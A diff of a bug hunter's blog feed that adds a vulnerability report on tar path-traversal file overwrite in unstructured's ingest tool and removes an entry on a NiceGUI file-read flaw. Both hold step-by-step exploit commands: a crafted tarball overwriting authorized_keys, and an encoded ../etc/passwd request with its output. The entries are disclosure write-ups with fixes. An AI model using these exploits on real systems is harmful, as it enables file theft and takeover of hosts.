@@ -1,4 +1,213 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-05-27T16:38:58+08:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat</title><link href="http://0.0.0.0:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers.html" rel="alternate" type="text/html" title="Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat" /><published>2024-05-27T10:31:06+08:00</published><updated>2024-05-27T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers</id><content type="html" xml:base="http://0.0.0.0:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers.html"><![CDATA[<h2 id="name">Name</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-05-29T16:26:52+08:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Arbitrary File Overwrite via unstructured-ingest in unstructured</title><link href="http://0.0.0.0:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured.html" rel="alternate" type="text/html" title="Arbitrary File Overwrite via unstructured-ingest in unstructured" /><published>2024-05-29T10:31:06+08:00</published><updated>2024-05-29T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Arbitrary File Overwrite via unstructured-ingest with uncompress enabled in unstructured</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="version">Version</h2>
+
+<blockquote>
+  <p>0.14.3</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>The unstructured ingest provide extra <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sftp"><code class="language-plaintext highlighter-rouge">sftp</code></a> and <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/google-cloud-storage"><code class="language-plaintext highlighter-rouge">gcs</code></a> modules to batch process all documents in remote cloud storages. The <a href="https://github.com/Unstructured-IO/unstructured/blob/3158169585b0ce8bbe784762133b244271a9dec8/unstructured/ingest/utils/compression.py#L76"><code class="language-plaintext highlighter-rouge">process_compressed_doc</code></a> is called to extract the compressed tarball files to local file system. However, the function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar.gz files that can overwrite any file.</p>
+
+<p>Using unstructured python sdk, a victim may download malicious tarball from remote cloud storages. The call stack is following: <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/pipeline/doc_factory.py#L10"><code class="language-plaintext highlighter-rouge">DocFactory.run</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/connector/fsspec/fsspec.py#L262"><code class="language-plaintext highlighter-rouge">FsspecSourceConnector.get_ingest_docs</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L83"><code class="language-plaintext highlighter-rouge">CompressionSourceConnectorMixin.process_compressed_doc</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L33"><code class="language-plaintext highlighter-rouge">uncompress_file</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66"><code class="language-plaintext highlighter-rouge">uncompress_tar_file</code></a>, The <code class="language-plaintext highlighter-rouge">uncompress_tar_file</code> calls <code class="language-plaintext highlighter-rouge">tarball.extractall</code> without sanitizing the members in tarball, causing members with absolute names or relative names will extracted and written outside target folder.</p>
+
+<p>The <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66"><code class="language-plaintext highlighter-rouge">uncompress_tar_file</code></a> function:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def uncompress_tar_file(tar_filename: str, path: Optional[str] = None) -&gt; str:
+    head, tail = os.path.split(tar_filename)
+    for ext in TAR_FILE_EXT:
+        if tail.endswith(ext):
+            tail = tail[: -(len(ext))]
+            break
+
+    path = path if path else os.path.join(head, f"{tail}-tar-uncompressed")
+    logger.info(f"extracting tar {tar_filename} -&gt; {path}")
+    with tarfile.open(tar_filename, "r:gz") as tfile:
+        tfile.extractall(path=path)
+    return path
+</code></pre></div></div>
+
+<p>The Python documentation explains us that tarfiles may have absolute filenames starting with / which could overwite files in system.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: Never extract archives from untrusted sources without prior inspection. 
+It is possible that files are created outside of path, 
+e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>For simplicity, I use sftp ingest to batch process documents from a test sftp server.</p>
+
+<p>First, let’s start a simple sftp server using docker from <a href="https://hub.docker.com/r/atmoz/sftp/"><code class="language-plaintext highlighter-rouge">atmoz/sftp</code></a>. The server is listen at my local network <code class="language-plaintext highlighter-rouge">10.15.0.5:2222</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run -p 2222:22 -d atmoz/sftp foo:pass:::upload
+</code></pre></div></div>
+
+<p>Next, create a malicous tar file using following command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -czvf hack.tar.gz /home/kali/.ssh/authorized_keys
+</code></pre></div></div>
+
+<p>Then, upload <code class="language-plaintext highlighter-rouge">hack.tar.gz</code> to previously created sftp server.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># login to sftp server, account: foo, password: pass
+sftp -P 2222 foo@10.15.0.5
+
+# cd into upload folder
+sftp&gt; cd upload
+
+# upload hack.tar.gz
+sftp&gt; put hack.tar.gz
+sftp&gt; ls -la
+-rw-r--r--    1 1000     100          2531 May 29 05:35 hack.tar.gz
+</code></pre></div></div>
+
+<p>Install <code class="language-plaintext highlighter-rouge">structrue</code> and <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sftp"><code class="language-plaintext highlighter-rouge">structure[sftp]</code></a>(using python3.10):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install unstructured
+pip install "unstructured[sftp]"
+</code></pre></div></div>
+
+<p>Using <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sft">python snippets</a> in offical document to fetch all documents from sftp server, note that with <code class="language-plaintext highlighter-rouge">uncompress=True</code> set, save as <code class="language-plaintext highlighter-rouge">unstructured_sftp.py</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from unstructured.ingest.interfaces import (
+    PartitionConfig,
+    ProcessorConfig,
+    ReadConfig,
+)
+from unstructured.ingest.runner import SftpRunner
+
+if __name__ == "__main__":
+    runner = SftpRunner(
+        processor_config=ProcessorConfig(
+            verbose=True,
+            output_dir="sftp-output",
+            num_processes=2,
+        ),
+        read_config=ReadConfig(),
+        partition_config=PartitionConfig(),
+        connector_config=SimpleSftpConfig(
+            access_config=SftpAccessConfig(
+                username="foo",
+                password="pass",
+            ),
+            remote_url="sftp://10.15.0.5:2222/upload",
+            recursive=True,
+            uncompress=True
+        ),
+    )
+    runner.run()
+</code></pre></div></div>
+
+<p>Lauch the attack, the file <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> in local system is overwritten</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python unstructured_sftp.py
+
+&gt; cat /home/kali/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
+</code></pre></div></div>
+
+<p>Or just using <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sftp"><code class="language-plaintext highlighter-rouge">unstructured-ingest sftp</code> shell command</a> with <code class="language-plaintext highlighter-rouge">--uncompress</code> enabled:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; unstructured-ingest \
+  sftp \
+  --remote-url sftp://10.15.0.5:2222/upload \
+  --username "foo" \
+  --password "pass" \
+  --num-processes 2 \
+  --recursive \
+  --uncompress \
+  --verbose
+
+
+&gt; cat /home/kali/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
+</code></pre></div></div>
+
+<h2 id="platform">Platform</h2>
+
+<p>I noticed the platform Data Ingestion Source Connectors also have <code class="language-plaintext highlighter-rouge">uncompress</code> option, For example:</p>
+
+<p><a href="https://docs.unstructured.io/platform/platform-source-connectors/sftp-storage">sftp-storage</a></p>
+
+<p><img src="/assets/images/bughunter/unstructured/Source-SFTP.png" alt="sftp" /></p>
+
+<p><a href="https://docs.unstructured.io/platform/platform-source-connectors/google-cloud">google cloud storage</a></p>
+
+<p><img src="/assets/images/bughunter/unstructured/Source-Google-Cloud.png" alt="gc" /></p>
+
+<h2 id="fix">Fix</h2>
+
+<p>Patch for <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L56C1-L67C16">uncompress_tar_file</a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def uncompress_tar_file(tar_filename: str, path: Optional[str] = None) -&gt; str:
+    # See: https://docs.python.org/3/library/tarfile.html#extraction-filters
+    def extraction_filter(member, path):
+        """Run tarfile.tar_filter, but raise the expected ValueError"""
+        # This is only called if the current Python has tarfile filters
+        try:
+            return tarfile.tar_filter(member, path)
+        except tarfile.FilterError as exc:
+            raise ValueError(str(exc))
+    
+    head, tail = os.path.split(tar_filename)
+    for ext in TAR_FILE_EXT:
+        if tail.endswith(ext):
+            tail = tail[: -(len(ext))]
+            break
+
+    path = path if path else os.path.join(head, f"{tail}-tar-uncompressed")
+    logger.info(f"extracting tar {tar_filename} -&gt; {path}")
+    with tarfile.open(tar_filename, "r:gz") as tfile:
+        tfile.extraction_filter = extraction_filter
+        tfile.extractall(path=path)
+    return path
+</code></pre></div></div>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
+
+<h3 id="ssh-access">SSH Access</h3>
+
+<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
+
+<h3 id="web-servers">Web Servers</h3>
+
+<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p>Version v1</p>
+
+<p><a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L83">https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L83</a></p>
+
+<p><a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66">https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66</a></p>
+
+<p>Version V2</p>
+
+<p><a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/v2/processes/uncompress.py#L29">https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/v2/processes/uncompress.py#L29</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat</title><link href="http://0.0.0.0:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers.html" rel="alternate" type="text/html" title="Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat" /><published>2024-05-27T10:31:06+08:00</published><updated>2024-05-27T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers</id><content type="html" xml:base="http://0.0.0.0:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat</p>
@@ -1223,146 +1432,4 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDb+p1vHNh3CdWiOt+1DDptHOL+Rs7/YeRmjALSIqEM
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58">https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">CVE-2024-32005: Local File Inclusion in NiceGUI leaflet component</title><link href="http://0.0.0.0:4000/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui.html" rel="alternate" type="text/html" title="CVE-2024-32005: Local File Inclusion in NiceGUI leaflet component" /><published>2024-04-10T10:31:06+08:00</published><updated>2024-04-10T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>NiceGUI: Local File Inclusion in NiceGUI leaflet component</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>CWE-22: Path Traversal</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>High (8.8)</p>
-</blockquote>
-
-<h2 id="cve">CVE</h2>
-
-<blockquote>
-  <p><a href="https://www.cve.org/CVERecord?id=CVE-2024-32005">CVE-2024-32005: Local File Inclusion in NiceGUI leaflet component</a></p>
-</blockquote>
-
-<h2 id="description">Description</h2>
-
-<p>A local file inclusion is present in the NiceUI leaflet component when requesting resource files under the <code class="language-plaintext highlighter-rouge">/_nicegui/{__version__}/resources/{key}/{path:path}</code> route.</p>
-
-<h2 id="proof-of-concept">Proof of Concept</h2>
-
-<p>In <a href="https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/nicegui.py#L98">route</a> <code class="language-plaintext highlighter-rouge">/_nicegui/{__version__}/resources/{key}/{path:path}</code> is used for <a href="https://github.com/zauberzeug/nicegui/commit/b465af3bb7a825c89ca6562e5eb7ebfeee5bb589">serving CSS and JS resources locally</a>. The <code class="language-plaintext highlighter-rouge">path</code> parameter in url is not sanitized before appended to base path, an attacker can use <code class="language-plaintext highlighter-rouge">..</code> to escape base directory and locate any file on system which will be sent back to the attacker, causing local file inclusion issue.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@app.get(f'/_nicegui/{__version__}' + '/resources/{key}/{path:path}')
-def _get_resource(key: str, path: str) -&gt; FileResponse:
-    if key in resources:
-        filepath = resources[key].path / path
-        if filepath.exists():
-            headers = {'Cache-Control': 'public, max-age=3600'}
-            media_type, _ = mimetypes.guess_type(filepath)
-            return FileResponse(filepath, media_type=media_type, headers=headers)
-    raise HTTPException(status_code=404, detail=f'resource "{key}" not found')
-</code></pre></div></div>
-
-<p>However, the <code class="language-plaintext highlighter-rouge">resources</code> is only <a href="https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/elements/leaflet.py#L40">initialized</a> by <code class="language-plaintext highlighter-rouge">ui.leaflet</code> component. To exploit the bug, a developer should use <code class="language-plaintext highlighter-rouge">leaflet</code> component in web pages so that the route is activated. Consider following <a href="https://nicegui.io/documentation/leaflet#leaflet_map">code snippet</a> from official document.</p>
-
-<p>Firstly, install nicegui using <code class="language-plaintext highlighter-rouge">python pip</code>:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install nicegui
-</code></pre></div></div>
-<p>Then, save following code to <code class="language-plaintext highlighter-rouge">main.py</code></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from nicegui import ui
-
-m = ui.leaflet(center=(51.505, -0.09))
-ui.label().bind_text_from(m, 'center', lambda center: f'Center: {center[0]:.3f}, {center[1]:.3f}')
-ui.label().bind_text_from(m, 'zoom', lambda zoom: f'Zoom: {zoom}')
-
-with ui.grid(columns=2):
-    ui.button('London', on_click=lambda: m.set_center((51.505, -0.090)))
-    ui.button('Berlin', on_click=lambda: m.set_center((52.520, 13.405)))
-    ui.button(icon='zoom_in', on_click=lambda: m.set_zoom(m.zoom + 1))
-    ui.button(icon='zoom_out', on_click=lambda: m.set_zoom(m.zoom - 1))
-
-ui.run()
-</code></pre></div></div>
-<p>Run the application, it will listen on <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8080</code> by default.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python main.py
-</code></pre></div></div>
-<p>Open the webpage in browser and intecept requests using burp suite or chrome devtools. We can capture following request:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://10.15.0.171:8080/_nicegui/1.4.20/resources/763203f93f18a3f1f5d14f74197580e4/leaflet/leaflet.js HTTP/1.1
-Accept: */*
-Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
-Cache-Control: no-cache
-Cookie: 
-Pragma: no-cache
-Referer: http://10.15.0.171:8080/
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
-Postman-Token: 73930b8b-6cc7-4511-aff9-ff25d835c300
-Host: 10.15.0.171:8080
-Accept-Encoding: gzip, deflate
-Connection: close
-</code></pre></div></div>
-<p>Modify the request by change <code class="language-plaintext highlighter-rouge">leaflet/leaflet.js</code> part to <code class="language-plaintext highlighter-rouge">%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code> which is <code class="language-plaintext highlighter-rouge">../../../../../etc/passwd</code> url-encoded content.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://10.15.0.171:8080/_nicegui/1.4.20/resources/763203f93f18a3f1f5d14f74197580e4/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64 HTTP/1.1
-Accept: */*
-Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
-Cache-Control: no-cache
-Cookie: _xsrf=2|87674a0e|961e2a9f73992956aae527a8f55167fb|1706518977; _gitlab_session=64bf3e7143f852d8e3646970f8c7b3df; fakesession=hello
-Pragma: no-cache
-Referer: http://10.15.0.171:8080/
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
-Postman-Token: 73930b8b-6cc7-4511-aff9-ff25d835c300
-Host: 10.15.0.171:8080
-Accept-Encoding: gzip, deflate
-Connection: close
-</code></pre></div></div>
-
-<p>Or just open link: <code class="language-plaintext highlighter-rouge">http://10.15.0.171:8080/_nicegui/1.4.20/resources/763203f93f18a3f1f5d14f74197580e4/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code> in browser(change ip and port to your server).</p>
-
-<p>The output is the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
-...
-</code></pre></div></div>
-
-<p><img src="/assets/cve/niceui.png" alt="niceui" /></p>
-
-<h2 id="impact">Impact</h2>
-
-<p>Any file on the backend filesystem can be read by an attacker with access to the NiceUI leaflet website.</p>
-
-<h2 id="reference">Reference</h2>
-
-<p><a href="https://github.com/zauberzeug/nicegui/issues/2870">https://github.com/zauberzeug/nicegui/issues/2870</a></p>
-
-<p><a href="https://www.cve.org/CVERecord?id=CVE-2024-32005">https://www.cve.org/CVERecord?id=CVE-2024-32005</a></p>
-
-<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32005">https://nvd.nist.gov/vuln/detail/CVE-2024-32005</a></p>
-
-<p><a href="https://github.com/zauberzeug/nicegui/security/advisories/GHSA-mwc7-64wg-pgvj">https://github.com/zauberzeug/nicegui/security/advisories/GHSA-mwc7-64wg-pgvj</a></p>
-
-<p><a href="https://huntr.com/bounties/29ec621a-bd69-4225-ab0f-5bb8a1d10c67">https://huntr.com/bounties/29ec621a-bd69-4225-ab0f-5bb8a1d10c67</a></p>
-
-<h2 id="occurrences">Occurrences</h2>
-
-<p><a href="https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/nicegui.py#L98">https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/nicegui.py#L98</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
+<p><a href="https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58">https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
